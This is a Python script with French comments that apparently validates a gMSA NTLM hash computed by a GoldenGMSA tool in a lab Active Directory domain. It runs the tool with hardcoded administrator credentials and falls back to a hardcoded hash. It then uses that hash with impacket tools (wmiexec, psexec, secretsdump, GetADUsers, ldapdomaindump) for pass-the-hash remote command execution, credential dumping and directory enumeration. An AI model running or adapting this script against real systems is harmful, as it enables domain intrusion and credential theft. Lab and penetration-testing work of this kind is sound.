#!/usr/bin/env python3
"""
Script pour valider un hash NTLM calculé par GoldenGMSA.
"""

import subprocess
import sys
import re

def get_ntlm_hash():
    """Récupère le hash NTLM actuel."""
    cmd = [
        'python3', 'main.py',
        '-u', 'Administrateur',
        '-p', 'Password1',
        '-d', 'lab.local',
        '--dc-ip', '172.31.124.12',
        'compute',
        '--sid', 'S-1-5-21-4163040651-2381858556-3943169962-1104'
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        
        # Extraire le hash NT seul
        match = re.search(r'NTLM Hash \(NT only\):\s+([a-f0-9]{32})', output)
        if match:
            return match.group(1)
        
        # Fallback: extraire du format LM:NT
        match = re.search(r'NTLM Hash \(LM:NT\):\s+[a-f0-9]{32}:([a-f0-9]{32})', output)
        if match:
            return match.group(1)
            
        return None
    except Exception as e:
        print(f"Erreur lors de la récupération du hash: {e}")
        return None

def test_hash_with_impacket(hash_nt, host="172.31.124.12", username="svc_test$", domain="lab.local"):
    """Teste le hash avec différents outils impacket."""
    
    # Hash LM vide pour gMSA
    lm_hash = "aad3b435b51404eeaad3b435b51404ee"
    hash_full = f"{lm_hash}:{hash_nt}"
    
    print(f"=== Hash NTLM à valider ===")
    print(f"NT Hash: {hash_nt}")
    print(f"Format complet (LM:NT): {hash_full}")
    print()
    
    tools = {
        "smbclient.py": [
            'python3', 'venv/bin/smbclient.py',
            '-hashes', hash_full,
            f'{domain}/{username}@{host}'
        ],
        "wmiexec.py": [
            'python3', 'venv/bin/wmiexec.py',
            '-hashes', hash_full,
            f'{domain}/{username}@{host}',
            'whoami'
        ],
        "psexec.py": [
            'python3', 'venv/bin/psexec.py',
            '-hashes', hash_full,
            f'{domain}/{username}@{host}',
            'whoami'
        ],
        "secretsdump.py": [
            'python3', 'venv/bin/secretsdump.py',
            '-hashes', hash_full,
            f'{domain}/{username}@{host}',
            '-target-ip', host
        ],
        "GetADUsers.py": [
            'python3', 'venv/bin/GetADUsers.py',
            '-hashes', hash_full,
            f'{domain}/{username}',
            '-dc-ip', host
        ],
        "ldapdomaindump.py": [
            'python3', 'venv/bin/ldapdomaindump',
            '-u', f'{username}',
            '-p', '',
            '--hashes', hash_full,
            '-d', domain,
            host
        ]
    }
    
    results = {}
    
    for tool_name, cmd in tools.items():
        print(f"=== Test avec {tool_name} ===")
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print(f"✓ {tool_name}: Authentification RÉUSSIE")
                print(f"  Output: {result.stdout[:200]}...")
                results[tool_name] = "SUCCESS"
            else:
                # Chercher les erreurs spécifiques
                if "STATUS_LOGON_FAILURE" in result.stderr or "LOGON_FAILURE" in result.stderr or "invalidCredentials" in result.stderr:
                    print(f"✗ {tool_name}: Échec authentification (hash invalide ou expiré)")
                    results[tool_name] = "INVALID_HASH"
                elif "Connection refused" in result.stderr or "Connection reset" in result.stderr:
                    print(f"⚠ {tool_name}: Service non disponible sur le port")
                    results[tool_name] = "SERVICE_UNAVAILABLE"
                else:
                    print(f"⚠ {tool_name}: Erreur (peut être service indisponible)")
                    print(f"  Error: {result.stderr[:200]}")
                    results[tool_name] = "ERROR"
        except subprocess.TimeoutExpired:
            print(f"⚠ {tool_name}: Timeout (peut être normal si service nécessite interaction)")
            results[tool_name] = "TIMEOUT"
        except Exception as e:
            print(f"✗ {tool_name}: Erreur - {e}")
            results[tool_name] = "EXCEPTION"
        print()
    
    return results

if __name__ == "__main__":
    print("=== Récupération du hash NTLM ===")
    hash_nt = get_ntlm_hash()
    
    if not hash_nt:
        print("✗ Impossible de récupérer le hash NTLM")
        # Utiliser le hash connu
        hash_nt = "c0c4058cba95fd028c947d0c65e8b19d"
        print(f"Utilisation du hash de test: {hash_nt}")
    
    print(f"Hash récupéré: {hash_nt}\n")
    
    print("=== Validation du hash avec impacket ===\n")
    results = test_hash_with_impacket(hash_nt)
    
    print("\n=== Résumé ===")
    success_count = sum(1 for v in results.values() if v == "SUCCESS")
    print(f"Tests réussis: {success_count}/{len(results)}")
    
    if success_count > 0:
        print("✓ Le hash NTLM est VALIDE et fonctionnel")
    else:
        print("⚠ Aucun test n'a réussi - cela peut être dû à:")
        print("  - Le hash a expiré (gMSA change de mot de passe périodiquement)")
        print("  - Services Windows non disponibles")
        print("  - Permissions insuffisantes du compte gMSA")

